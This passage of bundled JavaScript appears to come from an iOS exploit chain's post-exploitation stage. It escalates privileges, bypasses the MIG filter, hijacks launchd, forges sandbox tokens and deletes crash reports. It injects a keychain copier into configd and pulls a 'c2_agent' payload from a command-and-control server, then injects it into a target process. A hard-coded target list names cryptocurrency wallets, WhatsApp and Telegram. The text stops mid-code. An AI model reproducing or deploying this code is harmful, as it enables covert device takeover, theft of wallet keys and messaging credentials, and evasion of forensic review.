		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("pthread_mutex_init", mutexPtr, null);
		migFilterBypass = new MigFilterBypass(mutexPtr);
	}
	let driver = new libs_Driver_Driver__WEBPACK_IMPORTED_MODULE_7__["default"]();

	libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].init(driver, mutexPtr);

	let resultPE = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].runPE();
	if (!resultPE)
		return;

	globalThis.PE_SKIP_WORKER_EXIT = true;
	globalThis.PE_LISTEN_LOOP = true; // E4/D1: after start(), enter pe listen/heartbeat loop
	LOG("[PE-MAIN] start() entered PE_SKIP_WORKER_EXIT=true PE_LISTEN_LOOP=true");

	libs_TaskRop_TaskRop__WEBPACK_IMPORTED_MODULE_2__["default"].init();
	if(migFilterBypass)
		migFilterBypass.start();
	// E4/P2b: keep mig for on-demand InjectJS from pe listen (keychain_copier -> configd)
	globalThis.__pe_migFilterBypass = migFilterBypass;
	LOG("[PE-MAIN] stashed __pe_migFilterBypass for listen cmds");
	// ===== P7 Debug Logger (accumulate in memory, flush after sandbox escape) =====
	var p7_tag = "[P7] ";
	var p7_logBuf = "";
	function p7_flog(msg) {
		try {
			let s = String(msg == null ? "" : msg);
			// Drop per-unwrap / per-row noise; keep phase head/end + failures.
			if (s.indexOf("aksUnwrap:") === 0) return;
			if (s.indexOf("AKS unwrap kr=") === 0) return;
			if (s.indexOf("  ") === 0) return;
			if (s.indexOf("step") === 0) return;
			if (s.indexOf("metakey class=") === 0) return;
			if (s.indexOf("poke[") === 0) return;
			p7_logBuf += p7_tag + s + "\n";
			LOG(p7_tag + s);
		} catch (_) {}
	}
	function p7_flushLog() {
		if (!p7_logBuf) return;
		try {
			let p7_fd = fopen(get_cstring("/tmp/p7_debug.log"), get_cstring("a"));
			if (p7_fd && p7_fd !== 0n) {
				let p7_buf = get_cstring(p7_logBuf);
				fwrite(p7_buf, 1n, BigInt(p7_logBuf.length), p7_fd);
				fclose(p7_fd);
				let p7_flushedLen = p7_logBuf.length;
				p7_logBuf = "";
				p7_flog("log flushed to /tmp/p7_debug.log (" + p7_flushedLen + " bytes)");
			}
		} catch (p7_fe) {
			LOG(p7_tag + "flush failed: " + p7_fe);
		}
	}

	// E4/P3+ filtered P7: "whatsapp" = WA-only; "multi" = iOS17+task_config catalog; "" = full.
	let p7_enableP7 = false; // E5-M1: P7 off cold; hot p7_warmup + keychain_copier (no pe_dbg)
	let p7_agrpFilter = "multi";
	function peP7AgrpNeedles() {
		if (String(p7_agrpFilter || "") === "whatsapp")
			return ["whatsapp", "UKFA", "ukfa9xbx6k", "WhatsAppSMB"];
		if (globalThis.__pe_catalog_empty) return [];
		if (globalThis.__pe_p7_needles && globalThis.__pe_p7_needles.length)
			return globalThis.__pe_p7_needles;
		return [
			"whatsapp", "UKFA", "ukfa9xbx6k", "WhatsAppSMB",
			"bitpie", "im.token", "tokenpocket", "global.wallet",
			"sixdays.trust", "group.com.sixdays",
			"bitkeep", "coin98", "org.toshi", "toshi", "exodus",
			"io.metamask", "metamask", "mytonwallet",
			"app.phantom", "phantom", "skymavis", "genesis",
			"solflare", "tonhub", "tonkeeper", "jbig.tonkeeper",
			"tronlink", "uniswap", "okinc.okex", "okex",
			"krystal", "jpystal", "kyrd",
			"telegra", "telegraph"
		];
	}
	function peP7AgrpSqlWhere() {
		let f = String(p7_agrpFilter || "");
		if (!f) return "";
		let needles = peP7AgrpNeedles();
		if (!needles.length) return " WHERE 0";
		let parts = [];
		for (let i = 0; i < needles.length; i++)
			parts.push("agrp LIKE '%" + needles[i] + "%'");
		return " WHERE " + parts.join(" OR ");
	}
	function peP7MaxRows() {
		return String(p7_agrpFilter || "") === "whatsapp" ? 200 : 1500;
	}
	var p7_walletRules = [
		["whatsapp",    ["whatsapp", "ukfa9xbx6k", "ukfa", "whatsappsmb"]],
		["bitpie",      ["bitpie"]],
		["trustwallet", ["sixdays.trust", "group.com.sixdays"]],
		["imtoken",     ["im.token"]],
		["tokenpocket", ["tokenpocket", "global.wallet"]],
		["phantom",     ["app.phantom", "phantom"]],
		["uniswap",     ["uniswap"]],
		["coinbase",    ["org.toshi", "toshi"]],
		["bitget",      ["bitkeep"]],
		["metamask",    ["io.metamask", "metamask"]],
		["okx",         ["okinc.okex", "okex"]],
		["tronlink",    ["tronlink"]],
		["coin98",      ["coin98"]],
		["solflare",    ["solflare"]],
		["exodus",      ["exodus"]],
		["tonkeeper",   ["tonkeeper", "jbig.tonkeeper"]],
		["mytonwallet", ["mytonwallet"]],
		["ronin",       ["skymavis", "genesis"]],
		["tonhub",      ["tonhub"]],
		["krystal",     ["krystal", "jpystal", "kyrd"]],
		["telegram",    ["telegra", "telegraph"]]
	];
	globalThis.__peP7WalletRules = p7_walletRules;
	globalThis.__peP7Catalog = [
		{ id: "whatsapp", bids: ["net.whatsapp.whatsapp", "net.whatsapp.whatsappsmb"],
			frags: ["whatsapp"], groups: ["group.net.whatsapp"],
			needles: ["whatsapp", "UKFA", "ukfa9xbx6k", "WhatsAppSMB"] },
		{ id: "bitpie", bids: ["com.bitpie.wallet"], frags: ["bitpie"], needles: ["bitpie"] },
		{ id: "imtoken", bids: ["im.token.app"], frags: ["im.token", "imtoken"], needles: ["im.token"] },
		{ id: "tokenpocket", bids: ["com.global.wallet.ios", "com.tokenpocket.1"],
			frags: ["tokenpocket", "global.wallet"], needles: ["tokenpocket", "global.wallet"] },
		{ id: "trustwallet", bids: ["com.sixdays.trust"],
			frags: ["sixdays.trust", "sixdays"], needles: ["sixdays.trust", "group.com.sixdays"] },
		{ id: "bitget", bids: ["com.bitkeep.os"], frags: ["bitkeep"], needles: ["bitkeep"] },
		{ id: "coin98", bids: ["coin98.crypto.finance.insights"], frags: ["coin98"], needles: ["coin98"] },
		{ id: "coinbase", bids: ["org.toshi.distribution"], frags: ["org.toshi"], needles: ["org.toshi", "toshi"] },
		{ id: "exodus", bids: ["exodus-movement.exodus"], frags: ["exodus"], needles: ["exodus"] },
		{ id: "metamask", bids: ["io.metamask.metamask"], frags: ["metamask", "io.metamask"], needles: ["io.metamask", "metamask"] },
		{ id: "mytonwallet", bids: ["org.mytonwallet.app"], frags: ["mytonwallet"], needles: ["mytonwallet"] },
		{ id: "phantom", bids: ["app.phantom"], frags: ["app.phantom", "phantom"], needles: ["app.phantom", "phantom"] },
		{ id: "ronin", bids: ["com.skymavis.genesis"], frags: ["skymavis"], needles: ["skymavis", "genesis"] },
		{ id: "solflare", bids: ["com.solflare.mobile"], frags: ["solflare"], needles: ["solflare"] },
		{ id: "tonhub", bids: ["com.tonhub.app"], frags: ["tonhub"], needles: ["tonhub"] },
		{ id: "tonkeeper", bids: ["com.jbig.tonkeeper"], frags: ["tonkeeper", "jbig.tonkeeper"], needles: ["tonkeeper", "jbig.tonkeeper"] },
		{ id: "tronlink", bids: ["com.tronlink.hdwallet", "com.aspect.tronlink"],
			frags: ["tronlink"], needles: ["tronlink"] },
		{ id: "uniswap", bids: ["com.uniswap.mobile"], frags: ["uniswap"], needles: ["uniswap"] },
		{ id: "okx", bids: ["com.okex.okexappstorefull"], frags: ["okexappstore", "okinc.okex"], needles: ["okinc.okex", "okex"] },
		{ id: "krystal", bids: ["com.kyrd.krystal.ios", "com.kyrd.jpystal.ios"],
			frags: ["krystal", "jpystal", "kyrd"], needles: ["krystal", "jpystal", "kyrd"] },
		{ id: "telegram", bids: ["ph.telegra.telegraph"],
			frags: ["telegra", "telegraph", "telegram"], groups: ["group.ph.telegra"],
			needles: ["telegra", "telegraph"] }
	];
	let C2_PROBE_ONLY = false;
	// Cold SB: one RemoteCall, async c2_agent, wait /tmp/c2_ipc/agent.hb, then destroy RC.
	// Do not probe / stub / mem_loader (those were extra SB attaches).
	let C2_STUB_ONLY = false;
	let PE_SKIP_BS_INJECT = false;
	let PE_DIRECT_PIPELINE = false;
	globalThis.PE_SKIP_BS_INJECT = PE_SKIP_BS_INJECT;
	globalThis.PE_DIRECT_PIPELINE = PE_DIRECT_PIPELINE;
	LOG("[PE] p7_enableP7=" + p7_enableP7 + " agrpFilter=" + p7_agrpFilter +
		" C2_STUB_ONLY=" + C2_STUB_ONLY + " PE_SKIP_BS_INJECT=" + PE_SKIP_BS_INJECT +
		" PE_DIRECT_PIPELINE=" + PE_DIRECT_PIPELINE + " sb=async_c2_agent");

	// Slim pe: bootstrap stubbed in webpack; resolve = mem -> disk -> /api/payload/get (hot pull kept).
	function peResolveBootstrapSrc(forceNet) {
		let pname = "c2_bootstrap.js";
		try {
			if (!forceNet && globalThis.__pe_bootstrap_src && String(globalThis.__pe_bootstrap_src).length > 2000) {
				return String(globalThis.__pe_bootstrap_src);
			}
		} catch (_) {}
		let emb = "";
		try {
			emb = String(_raw_loader_c2_bootstrap_js__WEBPACK_IMPORTED_MODULE_18__["default"] || "");
		} catch (_) {
			emb = "";
		}
		if (emb.length > 2000 && emb.indexOf("c2_bootstrap omitted") < 0) {
			globalThis.__pe_bootstrap_src = emb;
			try { (globalThis.__peCacheWrite || __peCacheWrite)(pname, emb); } catch (_) {}
			return emb;
		}
		if (!forceNet) {
			try {
				let disk = (globalThis.__peCacheRead || __peCacheRead)(pname, 2000);
				if (disk && disk.indexOf("c2_bootstrap omitted") < 0) {
					globalThis.__pe_bootstrap_src = disk;
					LOG("[PE] bootstrap disk-cache hit len=" + disk.length);
					return disk;
				}
			} catch (_) {}
		}
		LOG("[PE] bootstrap fetch begin /api/payload/get emb_len=" + emb.length + " force=" + !!forceNet);
		let idn = (typeof pePayloadIdentity === "function" ? pePayloadIdentity : globalThis.pePayloadIdentity)();
		let httpPost = typeof __peHttpPostJson === "function" ? __peHttpPostJson : globalThis.__peHttpPostJson;
		if (typeof httpPost !== "function") {
			LOG("[PE] bootstrap fetch FAIL no __peHttpPostJson");
			return emb || "";
		}
		let resp = httpPost("/api/payload/get", JSON.stringify({
			name: pname,
			uid: idn.uid,
			uuid: idn.uuid,
			device_code: idn.device_code || idn.uuid
		}));
		if (!resp || resp.length < 100) {
			LOG("[PE] bootstrap fetch empty resp_len=" + (resp ? resp.length : 0));
			return emb || "";
		}
		let obj = null;
		try {
			obj = JSON.parse(resp);
		} catch (e) {
			LOG("[PE] bootstrap fetch JSON fail: " + e + " head=" + String(resp).slice(0, 80));
			return emb || "";
		}
		let src = (typeof __pePayloadSrcFromResp === "function" ? __pePayloadSrcFromResp(obj) : ((obj && obj.src) ? String(obj.src) : ""));
		if (src.length < 2000) {
			LOG("[PE] bootstrap fetch short len=" + src.length + " ok=" + (obj && obj.ok) + " enc_on=" + (obj && obj.enc_on));
			return emb || "";
		}
		globalThis.__pe_bootstrap_src = src;
		try {
			(globalThis.__peCacheWrite || __peCacheWrite)(pname, src, {
				sha256: obj && obj.sha256,
				size: obj && obj.size
			});
		} catch (_) {}
		LOG("[PE] bootstrap fetch ok len=" + src.length + " disk=1");
		return src;
	}
	globalThis.peResolveBootstrapSrc = peResolveBootstrapSrc;

	function peResolveNamedSrc(pname, omitNeedle, forceNet) {
		pname = String(pname || "");
		omitNeedle = String(omitNeedle || "omitted");
		// c2_agent.js: reuse on-device cache only if <5m; else force re-fetch and overwrite.
		let agentTtl = pname === "c2_agent.js";
		let agentStale = false;
		if (agentTtl && !forceNet) {
			let ageFn = globalThis.__peCacheAgeMs || __peCacheAgeMs;
			let ttl = Number(globalThis.PE_AGENT_CACHE_TTL_MS || PE_AGENT_CACHE_TTL_MS || 300000);
			let age = typeof ageFn === "function" ? ageFn(pname) : -1;
			if (age < 0 || age >= ttl) {
				agentStale = true;
				forceNet = true;
				LOG("[PE] c2_agent cache stale/missing age_ms=" + age + " ttl=" + ttl + " -> refetch");
			} else {
				LOG("[PE] c2_agent cache fresh age_ms=" + age + " ttl=" + ttl);
			}
		}
		try {
			if (!forceNet && globalThis.__pe_named_src && globalThis.__pe_named_src[pname] &&
				String(globalThis.__pe_named_src[pname]).length > 2000) {
				return String(globalThis.__pe_named_src[pname]);
			}
		} catch (_) {}
		if (!forceNet) {
			try {
				let disk = (globalThis.__peCacheRead || __peCacheRead)(pname, 2000);
				if (disk && disk.indexOf(omitNeedle) < 0) {
					if (!globalThis.__pe_named_src) globalThis.__pe_named_src = {};
					globalThis.__pe_named_src[pname] = disk;
					LOG("[PE] payload disk-cache hit name=" + pname + " len=" + disk.length);
					return disk;
				}
			} catch (_) {}
		}
		LOG("[PE] payload fetch begin /api/payload/get name=" + pname + " force=" + !!forceNet + (agentStale ? " refresh=1" : ""));
		let idn = (typeof pePayloadIdentity === "function" ? pePayloadIdentity : globalThis.pePayloadIdentity)();
		let httpPost = typeof __peHttpPostJson === "function" ? __peHttpPostJson : globalThis.__peHttpPostJson;
		function agentStaleFallback(why) {
			if (!agentStale) return "";
			try {
				let diskFb = (globalThis.__peCacheRead || __peCacheRead)(pname, 2000);
				if (diskFb && diskFb.indexOf(omitNeedle) < 0) {
					if (!globalThis.__pe_named_src) globalThis.__pe_named_src = {};
					globalThis.__pe_named_src[pname] = diskFb;
					LOG("[PE] c2_agent refetch fail (" + why + "); keep stale disk len=" + diskFb.length);
					return diskFb;
				}
			} catch (_) {}
			return "";
		}
		if (typeof httpPost !== "function") {
			LOG("[PE] payload fetch FAIL no __peHttpPostJson name=" + pname);
			return agentStaleFallback("no_http");
		}
		let reqBody = {
			name: pname,
			uid: idn.uid,
			uuid: idn.uuid,
			device_code: idn.device_code || idn.uuid
		};
		// c2_agent goes ch1 when session active; other hot modules stay clear.
		if (pname !== "c2_agent.js") reqBody.plain = 1;
		let resp = httpPost("/api/payload/get", JSON.stringify(reqBody));
		if (!resp || resp.length < 100) {
			LOG("[PE] payload fetch empty name=" + pname + " resp_len=" + (resp ? resp.length : 0));
			return agentStaleFallback("empty");
		}
		let obj = null;
		try {
			obj = JSON.parse(resp);
		} catch (e) {
			LOG("[PE] payload fetch JSON fail name=" + pname + " : " + e);
			return agentStaleFallback("json");
		}
		let src = (typeof __pePayloadSrcFromResp === "function" ? __pePayloadSrcFromResp(obj) : ((obj && obj.src) ? String(obj.src) : ""));
		if (src.length < 2000 || src.indexOf(omitNeedle) >= 0) {
			LOG("[PE] payload fetch short name=" + pname + " len=" + src.length + " ok=" + (obj && obj.ok));
			return agentStaleFallback("short");
		}
		if (!globalThis.__pe_named_src) globalThis.__pe_named_src = {};
		globalThis.__pe_named_src[pname] = src;
		try {
			(globalThis.__peCacheWrite || __peCacheWrite)(pname, src, {
				sha256: obj && obj.sha256,
				size: obj && obj.size
			});
		} catch (_) {}
		let headHint = (src.indexOf("Channel ch1") === 0 || src.indexOf("// Channel ch1") === 0) ? "ch1_helpers_head" :
			(src.indexOf("// C2 Agent") === 0 || src.indexOf("C2 Agent Payload") >= 0) ? "agent_head" : "other";
		let helpersMid = (src.indexOf("// Channel ch1") > 0 || src.indexOf("function __c2ChannelSeal") > 0) ? 1 : 0;
		LOG("[PE] payload fetch ok name=" + pname + " len=" + src.length +
			" enc_on=" + !!(obj && obj.enc_on) + " wire=" + ((obj && obj.wire) || "clear") +
			" head=" + headHint + " helpers_mid=" + helpersMid + (agentStale ? " refreshed=1" : ""));
		return src;
	}
	function peResolveAgentSrc(forceNet) {
		return peResolveNamedSrc("c2_agent.js", "c2_agent omitted", forceNet);
	}
	globalThis.peResolveAgentSrc = peResolveAgentSrc;
	globalThis.peResolveNamedSrc = peResolveNamedSrc;

	// Pack-baked C2/report -> IPC file for hot agent/modules (prefer pe list over their embedded defaults).
	function pePublishC2Endpoints() {
		try {
			let Npub = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"];
			try { Npub.callSymbol("mkdir", "/tmp/c2_ipc", 0x1ff); } catch (_) {}
			try { Npub.callSymbol("mkdir", "/tmp/c2_v1", 0x1ff); } catch (_) {}
			try { Npub.callSymbol("mkdir", "/tmp/c2_v1/sb", 0x1ed); } catch (_) {}
			function epUrl(ep) {
				if (!ep) return "";
				if (ep.url) return String(ep.url).replace(/\/$/, "");
				let scheme = String(ep.scheme || "https");
				let host = String(ep.host || ep.ip || "");
				if (!host) return "";
				let port = Number(ep.port) || (scheme === "http" ? 80 : 443);
				if ((scheme === "https" && port === 443) || (scheme === "http" && port === 80))
					return scheme + "://" + host;
				return scheme + "://" + host + ":" + port;
			}
			function listFrom(arr) {
				let out = [];
				let seen = {};
				let src = arr || [];
				for (let i = 0; i < src.length; i++) {
					let u = epUrl(src[i]);
					if (!u || seen[u]) continue;
					seen[u] = 1;
					out.push(u);
				}
				return out;
			}
			let c2 = listFrom(typeof PELOG_ENDPOINTS !== "undefined" ? PELOG_ENDPOINTS : []);
			let report = listFrom(typeof PELOG_REPORT_ENDPOINTS !== "undefined" ? PELOG_REPORT_ENDPOINTS : []);
			let endpoints = [];
			try {
				let src = (typeof PELOG_ENDPOINTS !== "undefined" && PELOG_ENDPOINTS) ? PELOG_ENDPOINTS : [];
				for (let j = 0; j < src.length; j++) {
					let e = src[j] || {};
					endpoints.push({
						scheme: e.scheme || "https",
						host: e.host || e.ip || "",
						ip: e.ip || "",
						port: Number(e.port) || 443,
						url: epUrl(e)
					});
				}
			} catch (_) {}
			let body = JSON.stringify({
				from: "pe_main",
				ts: Date.now(),
				primary: c2[0] || "",
				c2: c2,
				report: report,
				endpoints: endpoints,
				ping_path: "/api/health"
			}) + "\n";
			let ok1 = false, ok2 = false;
			try { ok1 = !!__peWriteFileUtf8("/tmp/c2_ipc/c2_endpoints.json", body); } catch (_) {}
			try { ok2 = !!__peWriteFileUtf8("/tmp/c2_v1/sb/c2_endpoints.json", body); } catch (_) {}
			try { __pePublishChannelIpc(); } catch (_) {}
			LOG("[PE] c2_endpoints published n=" + c2.length + " primary=" + (c2[0] || "-") +
				" ipc=" + ok1 + " sb=" + ok2);
			return { ok: !!(ok1 || ok2), c2: c2, report: report };
		} catch (ex) {
			LOG("[PE] c2_endpoints publish FAIL " + String(ex).slice(0, 80));
			return { ok: false, error: String(ex).slice(0, 80) };
		}
	}
	globalThis.pePublishC2Endpoints = pePublishC2Endpoints;

	LOG("[PE] creating launchdTask...");
	// iOS 18.4+ needs MigFilterBypass for thread_get_state; without it we see kr=53 (KERN_DENIED).
	if (migFilterBypass && typeof migFilterBypass.ready === "function" && !migFilterBypass.ready()) {
		LOG("[PE] mig bypass not ready - retry start before launchd");
		try { migFilterBypass.start(); } catch (migE) {
			LOG("[PE] mig bypass retry threw: " + migE);
		}
	}
	if (migFilterBypass && typeof migFilterBypass.ready === "function" && !migFilterBypass.ready()) {
		LOG("[PE] mig bypass STILL not ready - launchd RemoteCall likely DENIED (kr=53)");
	}
	// Restore old_pe cold launchd: full RemoteCall (not once), fail -> return false.
	globalThis.__pe_sandbox_tokens_ok = false;
	let launchdTask = new libs_TaskRop_RemoteCall__WEBPACK_IMPORTED_MODULE_8__["default"]("launchd", migFilterBypass);
	if (!launchdTask || !launchdTask.success()) {
		LOG("[PE] launchdTask FAILED");
		try {
			globalThis.__pe_launchd_q = {
				attempts: 0,
				max_attempts: 8,
				retry_ms: 30000,
				next_at: Date.now() + 10000,
				state: "idle",
				last_fail_ts: Date.now(),
				last_ok_ts: 0
			};
		} catch (_) {}
		return false;
	}
	LOG("[PE] launchdTask OK, init sandbox...");
	libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].initWithLaunchdTask(launchdTask);
	libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].deleteCrashReports();
	libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].createTokens();
	globalThis.__pe_sandbox_tokens_ok = true;
	LOG("[PE] sandbox tokens created");

	// LAB: post-sandbox pelog (network only after tokens; early MPD connect hangs/blocks).
	try {
		LOG("[PE] PELOG post-sandbox begin");
		let _SOCK = func_resolve("socket");
		let _CONN = func_resolve("connect");
		let _WR = func_resolve("write");
		let _CL = func_resolve("close");
		let _CA = func_resolve("calloc");
		let _fd = fcall(_SOCK, 2n, 1n, 0n);
		if (_fd >= 0n) {
			let _sa = fcall(_CA, 1n, 16n);
			uwrite64(_sa, 0x0200a8c09a1f0210n);
			let _cr = fcall(_CONN, _fd, _sa, 16n);
			if (_cr == 0n) {
				let _body = "{\"msg\":\"pe_sandbox_ok\"}";
				let _req = "POST /pelog HTTP/1.0\r\nHost: 192.168.31.32:9090\r\nContent-Type: application/json\r\nContent-Length: " + _body.length + "\r\n\r\n" + _body;
				fcall(_WR, _fd, get_cstring(_req), BigInt(_req.length));
				LOG("[PE] PELOG pe_sandbox_ok sent");
			} else {
				LOG("[PE] PELOG connect fail " + _cr);
			}
			fcall(_CL, _fd);
		}
	} catch (_peLogE) {
		try { LOG("[PE] PELOG err " + _peLogE); } catch (_e2) {}
	}

	// ===== Self-process ucred READ-ONLY probe =====
	// Uses the PROVEN path from sandbox extension code (line 6641-6653):
	//   proc + 0x18 -> credRef + 0x28 -> ucred
	//   ucred + 0x18 = cr_uid (offset 24, matches IDA key 35)
	//   ucred + 0x78 = cr_label (offset 120, matches IDA key 44)
	try {
		let C = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"];
		let HEX = libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_5__["default"].hex;
		let T = libs_TaskRop_Task__WEBPACK_IMPORTED_MODULE_3__["default"];

		let selfTask = T.gSelfTask.addr;
		let selfProcRO = C.read64(selfTask + C.offsets().procRO);
		let selfProc = C.read64(selfProcRO);
		LOG("[UCRED] task=" + HEX(C.strip(selfTask)) + " proc=" + HEX(C.strip(selfProc)));

		let credRef = C.read64(selfProc + 0x18n);
		LOG("[UCRED] credRef=" + HEX(C.strip(credRef)));

		let diag = "proc=" + HEX(C.strip(selfProc));

		if (credRef && C.strip(credRef) >= 0xffffffd000000000n) {
			let ucred = C.read64(credRef + 0x28n);
			LOG("[UCRED] ucred=" + HEX(C.strip(ucred)));
			diag += "|ucred=" + HEX(C.strip(ucred));

			if (ucred && C.strip(ucred) >= 0xffffffd000000000n) {
				let cr_uid = C.read32(ucred + 0x18n);
				let cr_ruid = C.read32(ucred + 0x1cn);
				let cr_svuid = C.read32(ucred + 0x20n);
				let cr_ngroups = C.read32(ucred + 0x24n);
				let cr_label = C.read64(ucred + 0x78n);
				LOG("[UCRED] cr_uid=" + cr_uid + " cr_ruid=" + cr_ruid + " cr_svuid=" + cr_svuid + " cr_ngroups=" + cr_ngroups);
				LOG("[UCRED] cr_label=" + HEX(C.strip(cr_label)));
				diag += "|uid=" + cr_uid + "|ruid=" + cr_ruid + "|svuid=" + cr_svuid;
				diag += "|ngroups=" + cr_ngroups + "|cr_label=" + HEX(C.strip(cr_label));

				// Also dump a few more ucred fields for structure verification
				for (let doff = 0x00n; doff <= 0x80n; doff += 8n) {
					try {
						let val = C.read64(ucred + doff);
						diag += "|u+" + doff.toString(16) + "=" + HEX(C.strip(val));
					} catch(e3) {}
				}
			} else {
				diag += "|ucred_INVALID";
			}
		} else {
			diag += "|credRef_INVALID";
		}

		globalThis.__ucredDiag = diag;
		LOG("[UCRED] diag=" + diag.substring(0, 200));
	} catch (probeErr) {
		globalThis.__ucredDiag = "probe_error:" + String(probeErr);
		LOG("[UCRED] error: " + probeErr);
	}
	// ===== End ucred probe =====

	// Flush Phase 1 log now that sandbox tokens exist
	if (p7_enableP7) {
		p7_flog("launchd RC OK, sandbox tokens created");
		p7_flushLog();
	}

	// ===== keychain_copier: must run BEFORE P7 Phase 2 sqlite pipeline =====
	if (p7_enableP7) {
	let _kcCold = String(_raw_loader_keychain_copier_js__WEBPACK_IMPORTED_MODULE_20__["default"] || "");
	if (_kcCold.indexOf("omitted (PE slim") >= 0) {
		LOG("[PE-WORKER] skip keychain_copier cold (slim stub; pe_load hot)");
	} else {
	LOG("[PE-WORKER] inject keychain_copier -> configd");
	try {
		let kcCopier = new _InjectJS__WEBPACK_IMPORTED_MODULE_6__["default"]("configd", _raw_loader_keychain_copier_js__WEBPACK_IMPORTED_MODULE_20__["default"], migFilterBypass);
		if (kcCopier.inject()) {
			LOG("[PE-WORKER] keychain_copier OK");
			libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].applyTokensForRemoteTask(kcCopier.task);
			kcCopier.destroy();
		} else {
			LOG("[PE-WORKER] keychain_copier FAILED");
		}
	} catch (kcErr) {
		LOG("[PE-WORKER] keychain_copier error: " + kcErr);
	}

	LOG("[PE-WORKER] waiting 3s for keychain copy...");
	for (let i = 1; i <= 3; i++) {
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("sleep", 1);
	}
	}
	} else {
		LOG("[PE-WORKER] skip keychain_copier (p7_enableP7=false)");
	}

	libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].adjustMemoryPressure(targetProcess);
	LOG("[PE] destroying launchd RC to free zone resources...");
	try { launchdTask.destroy(); } catch(e) { LOG("[PE] launchd destroy warn: " + e); }
	launchdTask = null;

	// ===== One SpringBoard RC: async c2_agent, wait agent.hb, destroy RC =====
	function peAgentHbFresh(maxAgeMs) {
		maxAgeMs = Number(maxAgeMs) > 0 ? Number(maxAgeMs) : 45000;
		let Nloc = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"];
		let paths = [
			"/tmp/c2_ipc/agent.hb",
			"/var/tmp/c2_ipc/agent.hb",
			"/private/var/tmp/c2_ipc/agent.hb",
			"/tmp/c2_ipc/bs.heartbeat"
		];
		for (let pi = 0; pi < paths.length; pi++) {
			try {
				let fd = Number(Nloc.callSymbol("open", paths[pi], 0));
				if (!(fd >= 0)) continue;
				let buf = Nloc.callSymbol("malloc", 512);
				let n = Number(Nloc.callSymbol("read", fd, buf, 480));
				Nloc.callSymbol("close", fd);
				let s = "";
				try { if (n > 0 && buf) s = Nloc.readString(buf); } catch (_) {}
				try { Nloc.callSymbol("free", buf); } catch (_) {}
				if (!s) continue;
				let o = JSON.parse(s);
				let ts = Number(o && o.ts ? o.ts : 0);
				if (ts && (Date.now() - ts) < maxAgeMs) return true;
			} catch (_) {}
		}
		return false;
	}
	globalThis.__peAgentHbFresh = peAgentHbFresh;

	if (PE_SKIP_BS_INJECT || C2_PROBE_ONLY) {
		LOG("[PE-WORKER] skip SB agent PE_SKIP_BS_INJECT=" + PE_SKIP_BS_INJECT +
			" C2_PROBE_ONLY=" + C2_PROBE_ONLY);
		if (PE_SKIP_BS_INJECT) globalThis.__pe_bootstrap_skipped = true;
	} else {
		LOG("[PE-WORKER] skip loader.js / c2_probe / stub / mem_loader - one SB RC for c2_agent");
		try {
			let ids0 = peResolveDeviceIds(libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"], { allowNative: false });
			LOG("[PE-WORKER] device uuid=" + (ids0 && ids0.uuid) + " src=" + (ids0 && ids0.source) +
				" serial=" + (ids0 && ids0.serial ? "y" : "n") + " unique=" + (ids0 && ids0.unique ? "y" : "n"));
		} catch (idErr) {
			LOG("[PE-WORKER] device uuid resolve warn: " + idErr);
		}
		LOG("[PE-WORKER] inject c2_agent async -> " + targetProcess);
		globalThis.__pe_sb_agent_cold = true;
		try {
			try { pePublishC2Endpoints(); } catch (pubE) {
				LOG("[PE-WORKER] c2_endpoints warn: " + pubE);
			}
			try { __pePublishChannelIpc(); } catch (_) {}
			try { __pePublishChannelHelpers(); } catch (chH) {
				LOG("[PE-WORKER] channel helpers warn: " + chH);
			}
			// forceNet: bypass on-device cache for fresh issue.
			let agentSrc = peResolveAgentSrc(true);
			if (!agentSrc || agentSrc.length < 2000 || agentSrc.indexOf("c2_agent omitted") >= 0) {
				LOG("[PE-WORKER] c2_agent resolve FAIL len=" + (agentSrc ? agentSrc.length : 0));
				throw new Error("agent_src_missing");
			}
			// Safety: never inject channel helpers into SB (parse/eval kills agent.entered).
			try {
				let _cut = agentSrc.indexOf("// Channel ch1");
				if (_cut > 1000) {
					let _boot = agentSrc.indexOf("function _bootStep", _cut);
					if (_boot > _cut) {
						agentSrc = agentSrc.slice(0, _cut) + agentSrc.slice(_boot);
						LOG("[PE-WORKER] stripped mid helpers before inject new_len=" + agentSrc.length);
					}
				} else if (_cut === 0) {
					let _ag = agentSrc.indexOf("// C2 Agent Payload");
					if (_ag > 0) {
						agentSrc = agentSrc.slice(_ag);
						LOG("[PE-WORKER] stripped prepend helpers before inject new_len=" + agentSrc.length);
					}
				}
			} catch (_) {}
			// InjectJS writeStr/CFStringCreate uses .length as byte size + charCodeAt&0xff.
			// ch1 unwrap yields real Unicode (UTF-8 decode); plain HTTP often yields
			// Latin-1-of-UTF8 byte-strings. Unicode → calloc shortfall / truncated C string
			// → SB evaluateScript never hits agent.entered. Normalize to UTF-8 byte-str.
			try {
				let _charLen = agentSrc.length;
				let _needUtf8 = false;
				for (let _i = 0; _i < agentSrc.length; _i++) {
					if (agentSrc.charCodeAt(_i) > 0xff) { _needUtf8 = true; break; }
				}
				if (_needUtf8) {
					agentSrc = unescape(encodeURIComponent(agentSrc));
					LOG("[PE-WORKER] agent utf8-byte-str char_len=" + _charLen +
						" byte_len=" + agentSrc.length + " delta=" + (agentSrc.length - _charLen));
				}
			} catch (u8e) {
				LOG("[PE-WORKER] agent utf8-byte-str warn: " + u8e);
			}
			LOG("[PE-WORKER] c2_agent src len=" + agentSrc.length +
				" plain_head=" + String(agentSrc).slice(0, 40).replace(/\n/g, "\\n") +
				" (async fire, tokens on same RC)");
			let agentInj = new _InjectJS__WEBPACK_IMPORTED_MODULE_6__["default"](targetProcess, agentSrc, migFilterBypass, false, {
				skipDiag: true,
				forceCfString: true,
				applyTokensBefore: true
			});
			if (!agentInj.inject()) {
				LOG("[PE-WORKER] c2_agent async inject() false - no second SB RC");
			} else {
